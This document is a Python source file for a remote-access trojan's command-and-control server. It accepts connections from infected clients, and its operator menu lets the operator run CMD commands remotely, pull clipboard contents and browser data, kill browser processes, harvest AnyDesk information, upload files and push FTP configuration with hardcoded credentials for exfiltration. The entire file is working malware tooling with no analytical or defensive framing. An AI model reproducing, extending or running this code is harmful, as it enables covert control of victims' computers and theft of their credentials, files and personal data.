import socket
import threading
import json
import struct

class Server:
    def __init__(self, host = '192.168.144.113', port = 63214):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen()
        self.clients = []

    def broadcast(self, message):
        for client in self.clients:
            client.send(message)
    
    def struct(self, code, args):
        return json.dumps({'code': code,'args': args})
    
    def send(self, A, code, args):
        d=self.struct(code, args)
        self.sendall(A,d)
    
    def sendall(self, A, data):
        try:
            try:ii = data.encode()
            except:ii = data
            ii = struct.pack('>I', len(ii)) + ii
            A.sendall(ii)
        except:pass
    
    def handle_client(self, client):
        while True:
            try:
                data_len = struct.unpack('>I', client.recv(4))[0]
                received_data = b''
                while len(received_data) < data_len:
                    received_data += client.recv(data_len-len(received_data))
                print(received_data)
                print("1. Get Results of CMD commands in Client")
                print("2. Delete Client Shell or Not")
                print("3. Get result of Clip")
                print("4. Get Browsers info again")
                print("5. Upload file or files or file list")
                print("6. Kill Google & Browser service in Client")
                print("7. Update Anydesk info and Upload it in Client")
                print("8. FTP server configuration")
                inp = input("Input Code: ")
                args = ""
                if inp == '1':  
                    cmd = input("Input CMD command: ")
                    args = {'admin':'server', 'cmd':cmd}
                elif inp == '2':
                    ins = input("Delete Shell or Not(Y/N): ")
                    if(ins == 'Y'):
                        args = 'delete'
                elif inp == '4' or inp == '6' or inp == '7':
                    args = {'admin':'server'}     
                elif inp == '8':
                    args = {'admin':'server', 'cmd':{'hn':'192.168.144.113', 'un': 'user', 'pw': '12345'}}
                print(args)
                self.send(client, int(inp), args)
            except Exception as e:
                print(f"Error Occurred: {e}")
                self.clients.remove(client)
                client.close()
                break

    def run(self):
        while True:
            print("Listening Client...")
            client, address = self.server.accept()
            print(f"Connected with {str(address)}")
            self.clients.append(client)
            thread = threading.Thread(target=self.handle_client, args=(client,))
            thread.start()

if __name__ == "__main__":
    server = Server()
    server.run()